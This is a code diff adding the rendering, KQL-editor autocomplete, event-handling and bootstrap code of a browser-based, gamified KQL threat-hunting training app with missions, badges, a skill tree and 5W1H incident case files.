+        ${weakest.length ? weakest.map(s => `<div class="skill-row"><span>${esc(s.c)}</span><div class="skill-bar"><div class="skill-bar-fill bad" style="width:${s.pct}%"></div></div><span>${s.pct}%</span></div>`).join('') : '<div class="skill-empty">Complete a few missions to see this.</div>'}
+      </div>
+    </div>
+    <div class="activity-feed">
+      <div class="skill-col-head">Recent Activity</div>
+      ${p.activityLog.slice(0, 10).map(a => `<div class="activity-row"><span>${new Date(a.ts).toLocaleString()}</span><span>${esc(a.label)}</span><span class="activity-xp">+${a.xp} XP</span></div>`).join('') || '<div class="skill-empty">No activity yet.</div>'}
+    </div>
+    <div class="danger-zone">
+      <div class="danger-zone-head">Danger Zone</div>
+      <div class="danger-zone-body">Wipe your XP, badges, levels, and mission progress, and restart training from Mission 1.</div>
+      <button class="btn btn-ghost danger" data-action="open-reset-confirm">🗑️ Reset Progress</button>
+    </div>
+  </div>`;
+}
+
+function renderBadges() {
+  const p = state.player;
+  return `<div class="badges-screen">
+    <button class="btn btn-ghost small" data-action="goto-dashboard">← Mission Control</button>
+    <h2 class="section-title">🏅 BADGE COLLECTION — ${p.badges.length}/${BADGES.length}</h2>
+    <div class="badge-grid">
+      ${BADGES.map(b => {
+        const got = p.badges.includes(b.id);
+        return `<div class="badge-card ${got ? '' : 'locked'}" style="--rc:${RARITY_COLOR[b.rarity]}">
+          <div class="badge-icon hex-frame"><span class="badge-icon-glyph">${got ? b.icon : '🔒'}</span></div>
+          <div class="badge-name">${esc(b.name)}</div>
+          <div class="badge-rarity">${b.rarity}</div>
+          <div class="badge-desc">${esc(b.desc)}</div>
+        </div>`;
+      }).join('')}
+    </div>
+  </div>`;
+}
+
+function renderSkillTree() {
+  const groups = {
+    Fundamentals: ['tables', 'take', 'project', 'where', 'string comparison', 'and/or'],
+    'Filtering & Data': ['sort', 'order by', 'distinct', 'count', 'search'],
+    Aggregation: ['summarize', 'count()', 'countif', 'dcount', 'bin', 'where after summarize'],
+    'Strings & Shape': ['has', 'contains', 'string operators', 'extend', 'iff', 'split', 'tostring'],
+    'Advanced KQL': ['join', 'join (self)', 'union', 'let', 'in', 'datetime math'],
+    'Threat Hunting': ['LOLBins', 'process ancestry', 'network correlation', 'multi-table', 'synthesis'],
+  };
+  let html = `<div class="skilltree-screen">
+    <button class="btn btn-ghost small" data-action="goto-dashboard">← Mission Control</button>
+    <h2 class="section-title">🌳 SKILL TREE</h2>
+    <div class="skilltree-grid">`;
+  Object.entries(groups).forEach(([grp, concepts]) => {
+    html += `<div class="skilltree-branch"><div class="branch-title">${esc(grp)}</div><div class="branch-nodes">`;
+    concepts.forEach(c => {
+      const m = conceptMastery(c);
+      const cls = m === null ? 'untouched' : m >= 80 ? 'mastered' : m >= 40 ? 'learning' : 'weak';
+      html += `<div class="skill-node ${cls}"><div class="skill-node-name">${esc(c)}</div><div class="skill-node-pct">${m === null ? '—' : m + '%'}</div></div>`;
+    });
+    html += `</div></div>`;
+  });
+  html += `</div></div>`;
+  return html;
+}
+
+function renderCaseFiles() {
+  return `<div class="casefiles-screen">
+    <button class="btn btn-ghost small" data-action="goto-dashboard">← Mission Control</button>
+    <h2 class="section-title">🗂️ CASE FILE ARCHIVE</h2>
+    <p class="casefiles-intro">Real-world-style investigations. No guided steps — dig through the full environment with your own queries, then write up the incident using the 5W1H framework every SOC report needs: <b>Who, What, When, Where, Why, How.</b></p>
+    <div class="casefile-grid">
+      ${CASE_FILES.map(c => {
+        const prog = caseProgress(c.id);
+        return `<div class="casefile-card ${prog.solved ? 'solved' : ''}" data-action="open-casefile" data-id="${c.id}">
+          <div class="casefile-card-top"><span>${starRow(c.difficulty)}</span>${prog.solved ? '<span class="tag-done">✅ CLOSED</span>' : ''}</div>
+          <div class="casefile-card-title">${esc(c.title)}</div>
+          <div class="casefile-card-meta">${prog.scored}/6 questions answered</div>
+          <div class="skill-bar"><div class="skill-bar-fill good" style="width:${Math.round(prog.scored / prog.total * 100)}%"></div></div>
+        </div>`;
+      }).join('')}
+    </div>
+  </div>`;
+}
+
+function renderCaseFile() {
+  const c = getCaseById(state.currentCaseId);
+  if (!c) return renderCaseFiles();
+  const rec = state.player.caseFiles[c.id] || { attempts: 0, scoredKeys: [], xpEarned: 0, solved: false, lastAnswers: {} };
+  const grade = state.caseGrade;
+
+  let resultsHtml = '';
+  if (state.caseLastError) {
+    resultsHtml = `<div class="feedback fail"><div class="feedback-head">⚠️ QUERY ERROR</div><pre class="err-msg">${esc(state.caseLastError)}</pre></div>`;
+  } else if (state.caseLastRows) {
+    resultsHtml = renderResultsTable(state.caseLastRows);
+  }
+
+  const datasets = c.datasets || [];
+  const colsHtml = datasets.map(d => `<div class="ds-chip">${esc(d)}<div class="ds-cols">${(TABLE_COLUMNS[d] || []).join(', ')}</div></div>`).join('');
+
+  const qKeys = ['who', 'what', 'when', 'where', 'why', 'how'];
+  const qIcon = { who: '👤', what: '❓', when: '🕐', where: '📍', why: '🎯', how: '⚙️' };
+  const formHtml = qKeys.map(k => {
+    const q = c.questions[k];
+    const already = rec.scoredKeys.includes(k);
+    const wrongThisRound = grade && grade[k] === false;
+    const val = (rec.lastAnswers && rec.lastAnswers[k]) || '';
+    return `<div class="case-q ${already ? 'correct' : wrongThisRound ? 'wrong' : ''}">
+      <label class="case-q-label">${qIcon[k]} ${k.toUpperCase()}${already ? ' ✅' : ''}</label>
+      <div class="case-q-prompt">${esc(q.prompt)}</div>
+      <textarea id="case-answer-${k}" class="case-q-input" rows="2" ${already ? 'disabled' : ''} placeholder="Type your answer...">${esc(val)}</textarea>
+      ${wrongThisRound ? `<div class="case-q-hint">💡 ${esc(q.hint)}</div>` : ''}
+      ${state.caseShowAnswers ? `<div class="case-q-answer"><b>Model answer:</b> ${esc(q.modelAnswer)}</div>` : ''}
+    </div>`;
+  }).join('');
+
+  const newBadgeModal = state._newBadges && state._newBadges.length ? renderBadgeModal(state._newBadges) : '';
+
+  return `
+  <div class="mission-view casefile-view">
+    <div class="mission-briefing">
+      <div class="briefing-top">
+        <button class="btn btn-ghost small" data-action="goto-casefiles">← Case Archive</button>
+        <span class="mission-tag">CASE FILE</span>
+      </div>
+      <h2 class="briefing-title">${esc(c.title)}</h2>
+      <div class="briefing-meta"><span>${starRow(c.difficulty)}</span><span>+${c.xpPerQuestion}/question · +${c.bonusXp} bonus</span>${rec.solved ? '<span class="tag-done">✅ CLOSED</span>' : ''}</div>
+      <div class="briefing-story">${nl2br(c.briefing)}</div>
+      <div class="briefing-objective">💡 ${esc(c.startingTip)}</div>
+      <div class="ds-chips">${colsHtml}</div>
+    </div>
+    <div class="mission-workbench">
+      <div class="editor-toolbar">
+        <button class="btn btn-primary" data-action="run-case-query">▶ RUN QUERY</button>
+        <button class="btn btn-ghost" data-action="format-case-query">🧹 Format</button>
+        <button class="btn btn-ghost" data-action="reset-case-query">🔄 Clear</button>
+      </div>
+      <div class="editor-wrap">
+        <div class="editor-gutter" id="case-editor-gutter">1</div>
+        <textarea id="case-editor" class="editor-input" spellcheck="false" autocapitalize="off" autocomplete="off"
+          placeholder="Investigate freely — try any table, any query...">${esc(state._caseDraftQuery || '')}</textarea>
+      </div>
+      <div class="results-area">${resultsHtml}</div>
+      <div class="case-report">
+        <div class="case-report-head">📝 INCIDENT REPORT — 5W1H</div>
+        ${formHtml}
+        <div class="case-report-actions">
+          <button class="btn btn-primary" data-action="submit-case-answers">Submit Answers</button>
+          <button class="btn btn-ghost" data-action="toggle-case-answers">${state.caseShowAnswers ? 'Hide' : 'Reveal'} Model Answers</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  ${newBadgeModal}`;
+}
+
+// ---------------- KQL editor (plain, reliable — no HTML-overlay highlighting) ----------------
+// ---------------- IntelliSense-style autocomplete (Sentinel/KQL-editor-like) ----------------
+const KQL_OP_SUGGESTIONS = ['where', 'project', 'project-away', 'project-rename', 'extend', 'summarize', 'distinct', 'sort by', 'order by', 'take', 'limit', 'top', 'count', 'join', 'union', 'mv-expand', 'let', 'search'].map(l => ({ label: l, type: 'op' }));
+const KQL_KW_SUGGESTIONS = ['and', 'or', 'not', 'in', 'asc', 'desc', 'by', 'kind=inner', 'kind=leftouter', 'kind=leftanti', 'contains', 'has', 'startswith', 'endswith'].map(l => ({ label: l, type: 'kw' }));
+const KQL_FN_SUGGESTIONS = ['ago(', 'now()', 'count()', 'countif(', 'dcount(', 'avg(', 'min(', 'max(', 'sum(', 'bin(', 'tolower(', 'toupper(', 'isempty(', 'isnotempty(', 'strcat(', 'strlen(', 'tostring(', 'toint(', 'toreal(', 'todatetime(', 'parse_json(', 'iff(', 'case(', 'split(', 'dynamic(', 'round(', 'abs('].map(l => ({ label: l, type: 'fn' }));
+const KQL_TABLE_SUGGESTIONS = Object.keys(TABLE_COLUMNS).map(l => ({ label: l, type: 'table' }));
+const SUGGEST_TYPE_TAG = { op: 'OP', kw: 'KW', fn: 'FN', col: 'COL', table: 'TBL' };
+
+function currentTokenAt(text, caret) {
+  let start = caret;
+  while (start > 0 && /[A-Za-z0-9_.\-]/.test(text[start - 1])) start--;
+  return { start, token: text.slice(start, caret) };
+}
+function computeSuggestions(text, caret, datasets) {
+  const upToCaret = text.slice(0, caret);
+  const { start, token } = currentTokenAt(text, caret);
+  const beforeToken = upToCaret.slice(0, start);
+  const isFirstToken = !/\|/.test(beforeToken) && beforeToken.trim() === '';
+  let pool;
+  if (isFirstToken) {
+    pool = KQL_TABLE_SUGGESTIONS;
+  } else {
+    const cols = [];
+    (datasets || []).forEach(d => (TABLE_COLUMNS[d] || []).forEach(c => cols.push({ label: c, type: 'col' })));
+    pool = [...cols, ...KQL_OP_SUGGESTIONS, ...KQL_KW_SUGGESTIONS, ...KQL_FN_SUGGESTIONS];
+  }
+  if (!token) return { start, end: caret, items: [] };
+  const lower = token.toLowerCase();
+  const seen = new Set();
+  const items = [];
+  for (const p of pool) {
+    if (p.label.toLowerCase().startsWith(lower) && !seen.has(p.label)) {
+      seen.add(p.label); items.push(p);
+      if (items.length >= 8) break;
+    }
+  }
+  return { start, end: caret, items };
+}
+function getCaretPixelPos(textarea, position) {
+  const div = document.createElement('div');
+  const cs = window.getComputedStyle(textarea);
+  ['boxSizing', 'width', 'paddingTop', 'paddingRight', 'paddingBottom', 'paddingLeft', 'borderTopWidth', 'borderRightWidth', 'borderBottomWidth', 'borderLeftWidth', 'fontFamily', 'fontSize', 'fontWeight', 'fontStyle', 'letterSpacing', 'lineHeight', 'wordSpacing'].forEach(p => { div.style[p] = cs[p]; });
+  div.style.position = 'absolute';
+  div.style.visibility = 'hidden';
+  div.style.top = '-9999px';
+  div.style.left = '-9999px';
+  div.style.whiteSpace = 'pre-wrap';
+  div.style.wordWrap = 'break-word';
+  document.body.appendChild(div);
+  div.textContent = textarea.value.slice(0, position);
+  const span = document.createElement('span');
+  span.textContent = textarea.value.slice(position) || '.';
+  div.appendChild(span);
+  const rect = textarea.getBoundingClientRect();
+  const top = span.offsetTop - textarea.scrollTop;
+  const left = span.offsetLeft - textarea.scrollLeft;
+  document.body.removeChild(div);
+  return { top: rect.top + top, left: rect.left + left };
+}
+let suggestState = { items: [], index: 0, start: 0, end: 0 };
+function ensureSuggestBox() {
+  let box = document.getElementById('kql-suggest-box');
+  if (!box) { box = document.createElement('div'); box.id = 'kql-suggest-box'; box.className = 'suggest-box'; document.body.appendChild(box); }
+  return box;
+}
+function hideSuggestions() {
+  const box = document.getElementById('kql-suggest-box');
+  if (box) box.style.display = 'none';
+  suggestState.items = [];
+}
+function renderSuggestBox(ta) {
+  const box = ensureSuggestBox();
+  if (!suggestState.items.length) { box.style.display = 'none'; return; }
+  const pos = getCaretPixelPos(ta, suggestState.end);
+  box.style.left = pos.left + 'px';
+  box.style.top = (pos.top + 22) + 'px';
+  box.innerHTML = suggestState.items.map((it, i) => `
+    <div class="suggest-item ${i === suggestState.index ? 'active' : ''}" data-idx="${i}">
+      <span class="suggest-type suggest-type-${it.type}">${SUGGEST_TYPE_TAG[it.type]}</span>
+      <span class="suggest-label">${esc(it.label)}</span>
+    </div>`).join('') + `<div class="suggest-footer">↑↓ navigate · Tab/Enter accept · Esc dismiss</div>`;
+  box.style.display = 'block';
+  box.querySelectorAll('.suggest-item').forEach(el => {
+    el.addEventListener('mousedown', (e) => { e.preventDefault(); suggestState.index = +el.dataset.idx; acceptSuggestion(ta); });
+  });
+}
+function acceptSuggestion(ta) {
+  const item = suggestState.items[suggestState.index];
+  if (!item) return;
+  const before = ta.value.slice(0, suggestState.start);
+  const after = ta.value.slice(suggestState.end);
+  let insertText = item.label;
+  if (item.type === 'op' || item.type === 'kw' || item.type === 'table') insertText += ' ';
+  ta.value = before + insertText + after;
+  const newCaret = (before + insertText).length;
+  ta.selectionStart = ta.selectionEnd = newCaret;
+  hideSuggestions();
+  ta.dispatchEvent(new Event('input'));
+  ta.focus();
+}
+function updateSuggestions(ta, getDatasets) {
+  const caret = ta.selectionStart;
+  const result = computeSuggestions(ta.value, caret, getDatasets());
+  suggestState = { items: result.items, index: 0, start: result.start, end: result.end };
+  renderSuggestBox(ta);
+}
+
+// ---------------- shared KQL editor wiring (used by mission editor and case-file editor) ----------------
+function setupKqlEditor(taId, gutterId, getDatasets, onDraftChange, runActionName) {
+  const ta = document.getElementById(taId);
+  const gutter = document.getElementById(gutterId);
+  if (!ta) return;
+  function sync() {
+    const lines = ta.value.split('\n').length;
+    gutter.innerHTML = Array.from({ length: lines }, (_, i) => i + 1).join('<br>');
+    if (onDraftChange) onDraftChange(ta.value);
+    updateSuggestions(ta, getDatasets);
+  }
+  ta.addEventListener('input', sync);
+  ta.addEventListener('click', () => updateSuggestions(ta, getDatasets));
+  ta.addEventListener('keyup', (e) => { if (['ArrowLeft', 'ArrowRight', 'Home', 'End'].includes(e.key)) updateSuggestions(ta, getDatasets); });
+  ta.addEventListener('scroll', () => { gutter.scrollTop = ta.scrollTop; hideSuggestions(); });
+  ta.addEventListener('blur', () => setTimeout(hideSuggestions, 120));
+  ta.addEventListener('keydown', (e) => {
+    if (suggestState.items.length) {
+      if (e.key === 'ArrowDown') { e.preventDefault(); suggestState.index = (suggestState.index + 1) % suggestState.items.length; renderSuggestBox(ta); return; }
+      if (e.key === 'ArrowUp') { e.preventDefault(); suggestState.index = (suggestState.index - 1 + suggestState.items.length) % suggestState.items.length; renderSuggestBox(ta); return; }
+      if (e.key === 'Tab' || e.key === 'Enter') { e.preventDefault(); acceptSuggestion(ta); return; }
+      if (e.key === 'Escape') { hideSuggestions(); return; }
+    }
+    if (e.key === 'Tab') { e.preventDefault(); const s = ta.selectionStart, en = ta.selectionEnd; ta.value = ta.value.slice(0, s) + '  ' + ta.value.slice(en); ta.selectionStart = ta.selectionEnd = s + 2; sync(); }
+    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') { e.preventDefault(); hideSuggestions(); doAction(runActionName); }
+  });
+  sync();
+  ta.focus();
+}
+function setupEditor() {
+  setupKqlEditor('kql-editor', 'editor-gutter', () => {
+    const c = getChallengeById(state.currentId);
+    return (c && c.dataset) ? c.dataset.split('+').map(s => s.trim()) : Object.keys(TABLE_COLUMNS);
+  }, (v) => { state._draftQuery = v; }, 'run-query');
+}
+function setupCaseEditor() {
+  setupKqlEditor('case-editor', 'case-editor-gutter', () => Object.keys(TABLE_COLUMNS), (v) => { state._caseDraftQuery = v; }, 'run-case-query');
+}
+
+function insertAtCursor(text, taId) {
+  const ta = document.getElementById(taId || 'kql-editor');
+  if (!ta) return;
+  const s = ta.selectionStart, en = ta.selectionEnd;
+  const before = ta.value.slice(0, s), after = ta.value.slice(en);
+  const needsPipe = before.trim().length > 0 && !before.trim().endsWith('|') && /^(where|project|extend|summarize|distinct|sort|order|take|limit|top|count|join|union|mv-expand|search)/i.test(text);
+  const insert = needsPipe ? `\n| ${text}` : text;
+  ta.value = before + insert + after;
+  ta.selectionStart = ta.selectionEnd = (before + insert).length;
+  ta.dispatchEvent(new Event('input'));
+  ta.focus();
+}
+
+function formatQuery(code) {
+  return code.split('|').map(s => s.trim()).filter(Boolean).join('\n| ');
+}
+
+// ---------------- event wiring ----------------
+function wireEvents() {
+  $app().onclick = (e) => {
+    const el = e.target.closest('[data-action]');
+    if (!el) return;
+    doAction(el.dataset.action, el);
+  };
+  $app().onkeydown = (e) => {
+    if (e.key === 'Enter' && e.target.id === 'callsign-input') doAction('begin-training');
+  };
+  const historySelect = document.querySelector('[data-action="load-history"]');
+  if (historySelect) historySelect.onchange = (e) => {
+    const idx = e.target.value;
+    if (idx === '') return;
+    const q = (state.queryHistory[state.currentId] || [])[+idx];
+    const ta = document.getElementById('kql-editor');
+    ta.value = q;
+    ta.dispatchEvent(new Event('input'));
+  };
+}
+
+function goToMission(id) {
+  state.currentId = id;
+  state.hintLevel = 0;
+  state.attemptResult = null;
+  state.lastRunRows = null;
+  state.lastRunError = null;
+  state.showSolution = false;
+  state._newBadges = null;
+  state.levelUpFrom = null;
+  const c = getChallengeById(id);
+  state._draftQuery = priorQueryForStep(c);
+  state.screen = 'mission';
+}
+
+// Open a module: jump straight to its first not-yet-completed step (or its last step,
+// read-only-ish, if every step is already done — useful for revisiting a finished module).
+function startModule(moduleId) {
+  const steps = stepsOfModule(moduleId);
+  const next = steps.find(s => !isCompleted(s.id));
+  goToMission(next ? next.id : steps[steps.length - 1].id);
+}
+
+function doAction(action, el) {
+  switch (action) {
+    case 'begin-training': {
+      const input = document.getElementById('callsign-input');
+      state.player.name = (input && input.value.trim()) || 'ANALYST';
+      savePlayer();
+      goToMission(nextMissionId());
+      render();
+      break;
+    }
+    case 'goto-dashboard': state.screen = 'dashboard'; render(); break;
+    case 'goto-profile': state.screen = 'profile'; render(); break;
+    case 'goto-badges': state.screen = 'badges'; render(); break;
+    case 'goto-skilltree': state.screen = 'skilltree'; render(); break;
+    case 'goto-casefiles': state.screen = 'casefiles'; render(); break;
+    case 'open-casefile': {
+      state.currentCaseId = el.dataset.id;
+      state.caseLastRows = null; state.caseLastError = null; state.caseGrade = null; state.caseShowAnswers = false;
+      state._caseDraftQuery = '';
+      state._newBadges = null;
+      state.screen = 'casefile';
+      render();
+      break;
+    }
+    case 'run-case-query': {
+      const ta = document.getElementById('case-editor');
+      runCaseQuery(ta ? ta.value : '');
+      render();
+      break;
+    }
+    case 'format-case-query': {
+      const ta = document.getElementById('case-editor');
+      if (ta) { ta.value = formatQuery(ta.value); ta.dispatchEvent(new Event('input')); }
+      break;
+    }
+    case 'reset-case-query': { state._caseDraftQuery = ''; render(); break; }
+    case 'submit-case-answers': submitCaseAnswers(); render(); break;
+    case 'toggle-case-answers': state.caseShowAnswers = !state.caseShowAnswers; render(); break;
+    case 'toggle-mute': state.player.muted = !state.player.muted; savePlayer(); render(); break;
+    case 'open-reset-confirm': state.showResetConfirm = true; render(); break;
+    case 'cancel-reset': state.showResetConfirm = false; render(); break;
+    case 'confirm-reset': resetProgress().then(render); break;
+    case 'start-mission': goToMission(el.dataset.id); render(); break;
+    case 'start-module': startModule(el.dataset.id); render(); break;
+    case 'do-daily': {
+      const dailySeed = new Date().toISOString().slice(0, 10);
+      state.player.dailyDone[dailySeed] = true;
+      state.player.xp += 150;
+      logActivity('daily', 'Daily Mission: C2 Sweep', 150);
+      savePlayer(); render();
+      break;
+    }
+    case 'run-query': submitMission(); render(); break;
+    case 'get-hint': useHint(); render(); setTimeout(setupEditor, 0); break;
+    case 'reveal-solution': revealSolution(); render(); setTimeout(setupEditor, 0); break;
+    case 'reset-query': { state._draftQuery = priorQueryForStep(getChallengeById(state.currentId)); render(); break; }
+    case 'copy-query': {
+      const ta = document.getElementById('kql-editor');
+      if (ta) { navigator.clipboard && navigator.clipboard.writeText(ta.value).catch(() => {}); }
+      break;
+    }
+    case 'format-query': {
+      const ta = document.getElementById('kql-editor');
+      if (ta) { ta.value = formatQuery(ta.value); ta.dispatchEvent(new Event('input')); }
+      break;
+    }
+    case 'insert-chip': insertAtCursor(el.dataset.val); break;
+    case 'next-mission': {
+      const nm = nextMissionId();
+      if (nm) { goToMission(nm); render(); }
+      else { state.screen = 'dashboard'; render(); }
+      break;
+    }
+    case 'dismiss-badge': {
+      state._newBadges = state._newBadges ? state._newBadges.slice(1) : null;
+      if (state._newBadges && state._newBadges.length === 0) state._newBadges = null;
+      render(); setTimeout(setupEditor, 0);
+      break;
+    }
+    case 'dismiss-levelup': state.levelUpFrom = null; render(); setTimeout(setupEditor, 0); break;
+  }
+}
+
+function render() {
+  if (typeof hideSuggestions === 'function') hideSuggestions();
+  let inner = '';
+  const resetModal = state.showResetConfirm ? renderResetConfirmModal() : '';
+  if (state.screen === 'onboarding') {
+    inner = renderOnboarding();
+    $app().innerHTML = inner + resetModal;
+    wireEvents();
+    return;
+  }
+  const hud = renderHud();
+  if (state.screen === 'dashboard') inner = renderDashboard();
+  else if (state.screen === 'mission') inner = renderMission();
+  else if (state.screen === 'profile') inner = renderProfile();
+  else if (state.screen === 'badges') inner = renderBadges();
+  else if (state.screen === 'skilltree') inner = renderSkillTree();
+  else if (state.screen === 'casefiles') inner = renderCaseFiles();
+  else if (state.screen === 'casefile') inner = renderCaseFile();
+  $app().innerHTML = hud + `<div class="screen-body">${inner}</div>` + resetModal;
+  wireEvents();
+  if (state.screen === 'mission') setupEditor();
+  if (state.screen === 'casefile') setupCaseEditor();
+}
+
+// ============================================================
+// BOOTSTRAP
+// ============================================================
+async function main() {
+  const loaded = await loadPlayer();
+  state.player = loaded || freshPlayer();
+  // backfill any missing fields for players saved by an earlier version of the schema
+  const fresh = freshPlayer();
+  Object.keys(fresh).forEach(k => { if (state.player[k] === undefined) state.player[k] = fresh[k]; });
+  if (!state.player.name) {
+    state.screen = 'onboarding';
+  } else {
+    const nm = nextMissionId();
+    if (nm) goToMission(nm); else state.screen = 'dashboard';
+  }
+  render();
+}
+
+main();
+
+// Expose a small debug surface (useful for QA and for curious analysts poking the console).
+window.KQLQUEST_DEBUG = { state, ALL_STEPS, ALL_MODULES, CASE_FILES, REVIEW_TEMPLATES, DB, submitMission, goToMission, startModule, resetProgress, submitCaseAnswers, gradeCaseQuestion, runCaseQuery, render, runQuery, gradeResult, useHint, revealSolution };
+
+</script>
+</body>
+</html>
